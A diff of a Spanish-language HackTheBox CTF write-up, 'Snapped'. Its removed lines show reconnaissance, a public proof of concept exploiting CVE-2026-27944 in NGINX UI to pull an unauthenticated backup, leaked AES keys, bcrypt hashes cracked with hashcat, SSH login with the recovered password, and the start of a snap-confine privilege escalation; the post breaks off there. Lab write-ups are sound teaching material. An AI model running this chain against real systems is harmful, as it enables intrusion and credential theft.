@@ -1,19 +1,4 @@
-<!DOCTYPE html>
-<html lang="es">
-
-<head>
-  <title>
-  Snapped CTF · 0xjustgr0w
-</title>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="color-scheme" content="light dark">
-
-
-
-
-<meta name="author" content="David León">
-<meta name="description" content="
+<!doctype html><html lang=es><head><title>Snapped CTF · 0xjustgr0w</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="David León"><meta name=description content="
   Máquina Snapped
   
     
@@ -22,512 +7,114 @@
 
 
 Dificultad: Difícil
-Descripción: El objetivo snapped.htb aloja una aplicación NGINX UI v2.3.2 sobre Ubuntu. Mediante la vulnerabilidad de descarga de backups sin autenticación (CVE-2026-27944) extraemos un backup cifrado, recuperamos credenciales de la base de datos y accedemos como jonathan. La escalada de privilegios se logra explotando una condición de carrera TOCTOU en snap-confine (v2.63) junto con systemd-tmpfiles (CVE-2026-3888), obteniendo shell como root.">
-<meta name="keywords" content="blog,hacking,personal">
-
-
-
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Snapped CTF">
-  <meta name="twitter:description" content="Máquina SnappedLink to headingDificultad: Difícil
-Descripción: El objetivo snapped.htb aloja una aplicación NGINX UI v2.3.2 sobre Ubuntu. Mediante la vulnerabilidad de descarga de backups sin autenticación (CVE-2026-27944) extraemos un backup cifrado, recuperamos credenciales de la base de datos y accedemos como jonathan. La escalada de privilegios se logra explotando una condición de carrera TOCTOU en snap-confine (v2.63) junto con systemd-tmpfiles (CVE-2026-3888), obteniendo shell como root.">
-
-<meta property="og:url" content="https://justgr0w.github.io/posts/snapped/">
-  <meta property="og:site_name" content="0xjustgr0w">
-  <meta property="og:title" content="Snapped CTF">
-  <meta property="og:description" content="Máquina SnappedLink to headingDificultad: Difícil
-Descripción: El objetivo snapped.htb aloja una aplicación NGINX UI v2.3.2 sobre Ubuntu. Mediante la vulnerabilidad de descarga de backups sin autenticación (CVE-2026-27944) extraemos un backup cifrado, recuperamos credenciales de la base de datos y accedemos como jonathan. La escalada de privilegios se logra explotando una condición de carrera TOCTOU en snap-confine (v2.63) junto con systemd-tmpfiles (CVE-2026-3888), obteniendo shell como root.">
-  <meta property="og:locale" content="es">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2026-05-19T00:00:00+00:00">
-    <meta property="article:modified_time" content="2026-05-19T00:00:00+00:00">
-    <meta property="article:tag" content="CTF">
-    <meta property="article:tag" content="Hard">
-    <meta property="article:tag" content="HackTheBox">
-      <meta property="og:see_also" content="https://justgr0w.github.io/posts/abducted/">
-      <meta property="og:see_also" content="https://justgr0w.github.io/posts/variatype/">
-      <meta property="og:see_also" content="https://justgr0w.github.io/posts/principal/">
-      <meta property="og:see_also" content="https://justgr0w.github.io/posts/cap/">
-      <meta property="og:see_also" content="https://justgr0w.github.io/posts/puppy/">
-
-
-
-
-<link rel="canonical" href="https://justgr0w.github.io/posts/snapped/">
-
-
-<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
-<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
-
-
-  
-  
-  <link rel="stylesheet" href="/css/coder.min.022594d625780e2edf64581b893d32cb35c11de5d88953ea4ad3c2e45451e214.css" integrity="sha256-AiWU1iV4Di7fZFgbiT0yyzXBHeXYiVPqStPC5FRR4hQ=" crossorigin="anonymous" media="screen" />
-
-
-
-
-
-
-  
-    
-    
-    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
-  
-
-
-
- 
-
-
-
-
-<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
-<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
-<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
-
-<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
-<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-
-<link rel="manifest" href="/site.webmanifest">
-<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
-
-
-
-
-
-
-
-
-
-</head>
-
-
-
-
-
-
-<body class="preload-transitions colorscheme-auto">
-  
-<div class="float-container">
-    <a id="dark-mode-toggle" class="colorscheme-toggle">
-        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
-    </a>
-</div>
-
-
-  <main class="wrapper">
-    <nav class="navigation">
-  <section class="container">
-    
-    <a class="navigation-title" href="https://justgr0w.github.io/">
-      0xjustgr0w
-    </a>
-    
-    
-      <input type="checkbox" id="menu-toggle" />
-      <label class="menu-button float-right" for="menu-toggle">
-        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
-      </label>
-      <ul class="navigation-list">
-        
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="/contact/">Sobre mí</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="/posts/">Blog</a>
-            </li>
-          
-            <li class="navigation-item">
-              <a class="navigation-link " href="/projects/">Proyectos</a>
-            </li>
-          
-        
-        
-      </ul>
-    
-  </section>
-</nav>
-
-
-    <div class="content">
-      
-  <section class="container post">
-    <article>
-      <header>
-        <div class="post-title">
-          <h1 class="title">
-            <a class="title-link" href="https://justgr0w.github.io/posts/snapped/">
-              Snapped CTF
-            </a>
-          </h1>
-        </div>
-        <div class="post-meta">
-          <div class="date">
-            <span class="posted-on">
-              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
-              <time datetime="2026-05-19T00:00:00Z">
-                mayo 19, 2026
-              </time>
-            </span>
-            <span class="reading-time">
-              <i class="fa-solid fa-clock" aria-hidden="true"></i>
-              4 minutos de lectura.
-            </span>
-          </div>
-          <div class="authors">
-  <i class="fa-solid fa-user" aria-hidden="true"></i>
-    <a href="/authors/0xjustgr0w/">0xjustgr0w</a></div>
-
-          <div class="categories">
-  <i class="fa-solid fa-folder" aria-hidden="true"></i>
-    <a href="/categories/pentesting/">Pentesting</a></div>
-
-          <div class="tags">
-  <i class="fa-solid fa-tag" aria-hidden="true"></i>
-    <span class="tag">
-      <a href="/tags/ctf/">CTF</a>
-    </span>
-      <span class="separator">•</span>
-    <span class="tag">
-      <a href="/tags/hard/">Hard</a>
-    </span>
-      <span class="separator">•</span>
-    <span class="tag">
-      <a href="/tags/hackthebox/">HackTheBox</a>
-    </span></div>
-
-        </div>
-      </header>
-
-      <div class="post-content">
-        
-        <h1 id="máquina-snapped">
-  Máquina Snapped
-  <a class="heading-link" href="#m%c3%a1quina-snapped">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h1>
-<p><img src="/images/posts/snapped/target.png" alt=""></p>
-<p><strong>Dificultad</strong>: <em>Difícil</em></p>
-<p><strong>Descripción</strong>: El objetivo <code>snapped.htb</code> aloja una aplicación <strong>NGINX UI v2.3.2</strong> sobre Ubuntu. Mediante la vulnerabilidad de descarga de backups sin autenticación (<strong>CVE-2026-27944</strong>) extraemos un backup cifrado, recuperamos credenciales de la base de datos y accedemos como <code>jonathan</code>. La escalada de privilegios se logra explotando una condición de carrera TOCTOU en <code>snap-confine</code> (v2.63) junto con <code>systemd-tmpfiles</code> (<strong>CVE-2026-3888</strong>), obteniendo shell como root.</p>
-<h1 id="enumeración">
-  Enumeración
-  <a class="heading-link" href="#enumeraci%c3%b3n">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h1>
-<p><img src="/images/gifs/polish_waiting.gif" alt=""></p>
-<p>Comenzamos verificando conectividad y latencia base contra la IP objetivo:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">ping</span> <span class="o">-</span><span class="n">c1</span> <span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">67</span><span class="o">.</span><span class="mi">215</span>
-</span></span><span class="line"><span class="cl"><span class="no">PING</span> <span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">67</span><span class="o">.</span><span class="mi">215</span> <span class="p">(</span><span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">67</span><span class="o">.</span><span class="mi">215</span><span class="p">)</span> <span class="mi">56</span><span class="p">(</span><span class="mi">84</span><span class="p">)</span> <span class="n">bytes</span> <span class="n">of</span> <span class="n">data</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="mi">64</span> <span class="n">bytes</span> <span class="n">from</span> <span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">67</span><span class="o">.</span><span class="mi">215</span><span class="p">:</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">1</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">63</span> <span class="n">time</span><span class="o">=</span><span class="mi">93</span><span class="o">.</span><span class="mi">0</span> <span class="n">ms</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">---</span> <span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">67</span><span class="o">.</span><span class="mi">215</span> <span class="n">ping</span> <span class="n">statistics</span> <span class="o">---</span>
-</span></span><span class="line"><span class="cl"><span class="mi">1</span> <span class="n">packets</span> <span class="n">transmitted</span><span class="p">,</span> <span class="mi">1</span> <span class="n">received</span><span class="p">,</span> <span class="mi">0</span><span class="o">%</span> <span class="n">packet</span> <span class="n">loss</span><span class="p">,</span> <span class="n">time</span> <span class="mi">0</span><span class="n">ms</span>
-</span></span><span class="line"><span class="cl"><span class="n">rtt</span> <span class="n">min</span><span class="o">/</span><span class="n">avg</span><span class="o">/</span><span class="n">max</span><span class="o">/</span><span class="n">mdev</span> <span class="o">=</span> <span class="mi">92</span><span class="o">.</span><span class="mi">962</span><span class="o">/</span><span class="mi">92</span><span class="o">.</span><span class="mi">962</span><span class="o">/</span><span class="mi">92</span><span class="o">.</span><span class="mi">962</span><span class="o">/</span><span class="mi">0</span><span class="o">.</span><span class="mo">000</span> <span class="n">ms</span></span></span></code></pre></div>
-<p>El host responde correctamente. Procedemos con un escaneo completo de puertos TCP y, a continuación, enumeración de servicios en los puertos abiertos:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="n">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="n">snapped</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">oG</span> <span class="n">nmap</span><span class="o">/</span><span class="n">allPorts</span></span></span></code></pre></div>
-<p>Identificamos únicamente dos puertos abiertos: <strong>22/tcp</strong> (ssh) y <strong>80/tcp</strong> (http). Ejecutamos un escaneo dirigido con scripts y detección de versiones:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="n">n</span> <span class="n">snapped</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">oN</span> <span class="n">nmap</span><span class="o">/</span><span class="n">targeted</span>
-</span></span><span class="line"><span class="cl"><span class="no">PORT</span>   <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
-</span></span><span class="line"><span class="cl"><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="no">OpenSSH</span> <span class="mi">9</span><span class="o">.</span><span class="mi">6</span><span class="n">p1</span> <span class="no">Ubuntu</span> <span class="mi">3</span><span class="n">ubuntu13</span><span class="o">.</span><span class="mi">15</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mi">2</span><span class="o">.</span><span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">nginx</span> <span class="mi">1</span><span class="o">.</span><span class="mi">24</span><span class="o">.</span><span class="mi">0</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)</span></span></span></code></pre></div>
-<h3 id="web">
-  Web
-  <a class="heading-link" href="#web">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h3>
-<p>Fingerprinting de tecnologías sobre el servicio HTTP:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">whatweb</span> <span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">67</span><span class="o">.</span><span class="mi">215</span>
-</span></span><span class="line"><span class="cl"><span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">67</span><span class="o">.</span><span class="mi">215</span> <span class="o">[</span><span class="mi">302</span> <span class="no">Found</span><span class="o">]</span> <span class="no">Country</span><span class="o">[</span><span class="no">RESERVED</span><span class="o">][</span><span class="no">ZZ</span><span class="o">]</span><span class="p">,</span> 
-</span></span><span class="line"><span class="cl"><span class="no">HTTPServer</span><span class="o">[</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="o">][</span><span class="n">nginx</span><span class="o">/</span><span class="mi">1</span><span class="o">.</span><span class="mi">24</span><span class="o">.</span><span class="mi">0</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)</span><span class="o">]</span><span class="p">,</span> <span class="no">IP</span><span class="o">[</span><span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">67</span><span class="o">.</span><span class="mi">215</span><span class="o">]</span><span class="p">,</span> 
-</span></span><span class="line"><span class="cl"><span class="no">RedirectLocation</span><span class="o">[</span><span class="ss">http</span><span class="p">:</span><span class="sr">//sn</span><span class="n">apped</span><span class="o">.</span><span class="n">htb</span><span class="o">/]</span><span class="p">,</span> <span class="no">Title</span><span class="o">[</span><span class="mi">302</span> <span class="no">Found</span><span class="o">]</span><span class="p">,</span> <span class="n">nginx</span><span class="o">[</span><span class="mi">1</span><span class="o">.</span><span class="mi">24</span><span class="o">.</span><span class="mi">0</span><span class="o">]</span></span></span></code></pre></div>
-<p>El servidor redirige a <code>http://snapped.htb/</code>, por lo que debemos resolver el dominio localmente. Añadimos la entrada en nuestro <em>/etc/hosts</em>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="c1"># echo -e &#39;# Snapped HTB\n10.129.67.215\tsnapped.htb admin.snapped.htb&#39; &gt;&gt; /etc/hosts</span></span></span></code></pre></div>
-<p>Enumeramos subdominios contra <code>snapped.htb</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;http://snapped.htb&#39;</span> <span class="o">-</span><span class="n">H</span> <span class="s1">&#39;Host: FUZZ.snapped.htb&#39;</span> <span class="p">\</span>
-</span></span><span class="line"><span class="cl">  <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="no">Discovery</span><span class="o">/</span><span class="no">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mi">110000</span><span class="o">.</span><span class="n">txt</span> <span class="p">\</span>
-</span></span><span class="line"><span class="cl">  <span class="o">-</span><span class="n">t</span> <span class="mi">20</span> <span class="o">-</span><span class="n">r</span> <span class="o">-</span><span class="n">fs</span> <span class="mi">20199</span></span></span></code></pre></div>
-<p>Descubrimos el subdominio <strong><code>admin</code></strong> con respuesta <strong>200</strong> y tamaño <strong>1407 bytes</strong> — un vhost válido. Pasamos a fuzzing de directorios en <code>admin.snapped.htb</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;http://admin.snapped.htb/FUZZ&#39;</span> <span class="p">\</span>
-</span></span><span class="line"><span class="cl">  <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="no">Discovery</span><span class="o">/</span><span class="no">Web</span><span class="o">-</span><span class="no">Content</span><span class="o">/</span><span class="n">common</span><span class="o">.</span><span class="n">txt</span> <span class="p">\</span>
-</span></span><span class="line"><span class="cl">  <span class="o">-</span><span class="n">t</span> <span class="mi">50</span> <span class="o">-</span><span class="n">r</span> <span class="o">-</span><span class="n">e</span> <span class="o">.</span><span class="n">php</span><span class="p">,</span><span class="o">.</span><span class="n">txt</span><span class="p">,</span><span class="o">.</span><span class="n">zip</span></span></span></code></pre></div>
-<p>Entre los recursos relevantes encontramos <code>index.html</code> (200), <code>robots.txt</code> (200), <code>mcp</code> (403) y <strong><code>version.json</code></strong> (200). Consultamos la versión expuesta:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">curl</span> <span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="n">admin</span><span class="o">.</span><span class="n">snapped</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">version</span><span class="o">.</span><span class="n">json</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;version&#34;</span><span class="ss">:&#34;2.3.2&#34;</span><span class="p">,</span><span class="s2">&#34;build_id&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="s2">&#34;total_build&#34;</span><span class="p">:</span><span class="mi">512</span><span class="p">}</span></span></span></code></pre></div>
-<p>La versión <strong>2.3.2</strong> corresponde a <strong>NGINX UI</strong> y es vulnerable a <strong>CVE-2026-27944</strong> (descarga de backup sin autenticación con divulgación de clave de cifrado en cabeceras HTTP).</p>
-<h2 id="explotación-inicial--cve-2026-27944">
-  Explotación inicial — CVE-2026-27944
-  <a class="heading-link" href="#explotaci%c3%b3n-inicial--cve-2026-27944">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h2>
-<p>La aplicación expone un endpoint que permite descargar backups del sistema sin autenticación. El backup llega cifrado, pero la clave y el IV se revelan en las cabeceras de respuesta durante la descarga. Usamos el PoC público:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">python</span> <span class="n">cve</span><span class="o">-</span><span class="mi">2026</span><span class="o">-</span><span class="mi">27944</span><span class="o">.</span><span class="n">py</span> <span class="o">--</span><span class="n">target</span> <span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="n">admin</span><span class="o">.</span><span class="n">snapped</span><span class="o">.</span><span class="n">htb</span><span class="p">:</span><span class="mi">80</span> <span class="p">\</span>
-</span></span><span class="line"><span class="cl">  <span class="o">--</span><span class="n">out</span> <span class="n">backup</span><span class="o">.</span><span class="n">bin</span> <span class="o">--</span><span class="n">decrypt</span></span></span></code></pre></div>
-<h4 id="material-criptográfico">
-  Material criptográfico
-  <a class="heading-link" href="#material-criptogr%c3%a1fico">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">X-Backup-Security: nicDSFdgQlprXk6P8xbPokORKIebxWQj1Q8QhF5dqR4=:reqUY3keNgOhiaQk4zypVg==
-</span></span><span class="line"><span class="cl">AES-256 Key: nicDSFdgQlprXk6P8xbPokORKIebxWQj1Q8QhF5dqR4=
-</span></span><span class="line"><span class="cl">AES IV: reqUY3keNgOhiaQk4zypVg==</span></span></code></pre></div>
-<p>Resultado del descifrado:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Key</span> <span class="ss">length</span><span class="p">:</span> <span class="mi">32</span> <span class="n">bytes</span> <span class="p">(</span><span class="no">AES</span><span class="o">-</span><span class="mi">256</span> <span class="err">✓</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">IV</span> <span class="n">length</span> <span class="p">:</span> <span class="mi">16</span> <span class="n">bytes</span> <span class="p">(</span><span class="no">AES</span> <span class="n">block</span> <span class="n">size</span> <span class="err">✓</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Extracting</span> <span class="n">encrypted</span> <span class="n">backup</span> <span class="n">to</span> <span class="n">backup_extracted</span>
-</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Main</span> <span class="n">archive</span> <span class="ss">contains</span><span class="p">:</span> <span class="o">[</span><span class="s1">&#39;hash_info.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;nginx-ui.zip&#39;</span><span class="p">,</span> <span class="s1">&#39;nginx.zip&#39;</span><span class="o">]</span>
-</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Decrypting</span> <span class="n">hash_info</span><span class="o">.</span><span class="n">txt</span><span class="o">...</span>
-</span></span><span class="line"><span class="cl">    <span class="err">→</span> <span class="no">Saved</span> <span class="n">to</span> <span class="n">backup_extracted</span><span class="o">/</span><span class="n">hash_info</span><span class="o">.</span><span class="n">txt</span><span class="o">.</span><span class="n">decrypted</span> <span class="p">(</span><span class="mi">199</span> <span class="n">bytes</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Decrypting</span> <span class="n">nginx</span><span class="o">-</span><span class="n">ui</span><span class="o">.</span><span class="n">zip</span><span class="o">...</span>
-</span></span><span class="line"><span class="cl">    <span class="err">→</span> <span class="no">Saved</span> <span class="n">to</span> <span class="n">backup_extracted</span><span class="o">/</span><span class="n">nginx</span><span class="o">-</span><span class="n">ui_decrypted</span><span class="o">.</span><span class="n">zip</span> <span class="p">(</span><span class="mi">7778</span> <span class="n">bytes</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="err">→</span> <span class="no">Extracted</span> <span class="mi">2</span> <span class="n">files</span> <span class="n">to</span> <span class="n">backup_extracted</span><span class="o">/</span><span class="n">nginx</span><span class="o">-</span><span class="n">ui</span>
-</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Decrypting</span> <span class="n">nginx</span><span class="o">.</span><span class="n">zip</span><span class="o">...</span>
-</span></span><span class="line"><span class="cl">    <span class="err">→</span> <span class="no">Saved</span> <span class="n">to</span> <span class="n">backup_extracted</span><span class="o">/</span><span class="n">nginx_decrypted</span><span class="o">.</span><span class="n">zip</span> <span class="p">(</span><span class="mi">9936</span> <span class="n">bytes</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="err">→</span> <span class="no">Extracted</span> <span class="mi">22</span> <span class="n">files</span> <span class="n">to</span> <span class="n">backup_extracted</span><span class="o">/</span><span class="n">nginx</span></span></span></code></pre></div>
-<p>Datos de integridad del archivo:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">nginx-ui_hash: 394420319239a8526127bdb05faffecadf30d61bb7b66149d8ba262b7d2b1b63
-</span></span><span class="line"><span class="cl">nginx_hash: a49bce754d148666390537c046c4fd5ee88365eb651a2fc0897e34089bd0c07f
-</span></span><span class="line"><span class="cl">timestamp: 20260519-231816
-</span></span><span class="line"><span class="cl">version: 2.3.2</span></span></code></pre></div>
-<p>Del <code>database.db</code> extraído consultamos los hashes bcrypt de los usuarios:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">sqlite</span><span class="o">&gt;</span> <span class="nb">select</span> <span class="nb">name</span><span class="p">,</span><span class="n">password</span> <span class="n">from</span> <span class="n">users</span><span class="p">;</span></span></span></code></pre></div>
-<h4 id="credentialstxt">
-  credentials.txt
-  <a class="heading-link" href="#credentialstxt">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">admin / $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm
-</span></span><span class="line"><span class="cl">jonathan / $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq</span></span></code></pre></div>
-<p>Crackeamos los hashes con hashcat y rockyou:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">hashcat</span> <span class="o">-</span><span class="n">m</span> <span class="mi">3200</span> <span class="n">hashes</span><span class="o">.</span><span class="n">txt</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span></span></span></code></pre></div>
-<h4 id="credentialstxt-1">
-  Credentials.txt
-  <a class="heading-link" href="#credentialstxt-1">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">jonathan / linkinpark</span></span></code></pre></div>
-<p>Accedemos por SSH con las credenciales recuperadas:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">ssh</span> <span class="n">jonathan</span><span class="vi">@snapped</span><span class="o">.</span><span class="n">htb</span>
-</span></span><span class="line"><span class="cl"><span class="n">jonathan</span><span class="vi">@snapped</span><span class="ss">:~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
-</span></span><span class="line"><span class="cl"><span class="mi">21e329</span><span class="n">f1958563926cb45f9f58bcd5e6</span></span></span></code></pre></div>
-<h2 id="escalada-de-privilegios--cve-2026-3888">
-  Escalada de privilegios — CVE-2026-3888
-  <a class="heading-link" href="#escalada-de-privilegios--cve-2026-3888">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h2>
-<p>Una vez dentro, enumeramos binarios SUID:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;</span><span class="sr">/dev/nu</span><span class="n">ll</span>
-</span></span><span class="line"><span class="cl"><span class="sr">/snap/sn</span><span class="n">apd</span><span class="o">/</span><span class="mi">21759</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">snapd</span><span class="o">/</span><span class="n">snap</span><span class="o">-</span><span class="n">confine</span></span></span></code></pre></div>
-<p>Destaca un binario SUID poco habitual: <strong><code>snap-confine</code></strong> (snapd <strong>2.63</strong>). Revisamos timers del sistema:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">systemctl</span> <span class="n">list</span><span class="o">-</span><span class="n">timers</span>
-</span></span><span class="line"><span class="cl"><span class="n">systemd</span><span class="o">-</span><span class="n">tmpfiles</span><span class="o">-</span><span class="n">clean</span><span class="o">.</span><span class="n">timer</span> <span class="err">→</span> <span class="n">systemd</span><span class="o">-</span><span class="n">tmpfiles</span><span class="o">-</span><span class="n">clean</span><span class="o">.</span><span class="n">service</span> <span class="p">(</span><span class="n">activo</span> <span class="o">/</span> <span class="n">recurrente</span><span class="p">)</span></span></span></code></pre></div>
-<p>Y los snaps instalados:</p>
